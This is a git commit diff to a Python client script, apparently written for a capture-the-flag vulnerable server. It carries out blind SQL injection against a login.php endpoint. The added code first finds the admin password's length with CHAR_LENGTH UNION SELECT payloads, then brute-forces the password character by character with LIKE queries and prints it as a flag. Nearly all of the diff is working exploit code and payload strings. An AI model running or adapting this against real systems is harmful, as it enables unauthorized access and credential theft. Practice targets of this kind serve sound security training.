b0b17a31cfe9939ed0c35c59cdf76a6e472347a7
elc1798 <subliminalmau5@gmail.com>
2015-03-19 20:21:12 -0400

    Redo

--- VulnerableServer-60/client.py
+++ VulnerableServer-60/client.py
@@ -1,4 +1,5 @@
 import urllib2
+import sys
 
 HOST = "http://vulnserver-failedxyz.c9.io/login.php"
 
@@ -18,15 +19,38 @@ PREFIX = "\' UNION SELECT * from users where username = \"admin\" AND password L
 SUFFIX = "%\" -- "
 
 def brute():
+    print "Querying pass length..."
+    length = get_pass_length()
+    print "Got password length: " + str(length)
+    print "Running brute force..."
     answer = ""
-    for i in range(0 , 35):
+    for i in range(0 , length):
         for c in alpha:
+            print(answer + c)
             bkup = answer
             answer = con(PREFIX + answer + c + SUFFIX , "" , c , answer)
+            sys.stdout.write("\033[F") # Cursor up one line
             if bkup != answer:
-                print answer
                 break
 
-    print answer
+    print ""
+    print "FLAG: " + answer
+
+def get_pass_length():
+    length = 0
+    QUERY = "\ ' UNION SELECT * from users where username = \"admin\" AND CHAR_LENGTH(password) > "
+    COMMENT = " -- "
+    POSITIVE = "You're in!"
+    query_status = True
+    while query_status:
+        TMP = HOST + "?username=" + QUERY + str(length) + COMMENT + "&password="
+        print "Query: " + TMP
+        sys.stdout.write("\033[F") # Cursor up one line
+        TMP = TMP.replace(" " , "%20")
+        request = urllib2.Request(TMP , "")
+        received = urllib2.urlopen(request).read()
+        query_status = POSITIVE in received
+        length += 1
+    return length - 1 # Correct the last increment
 
 brute()
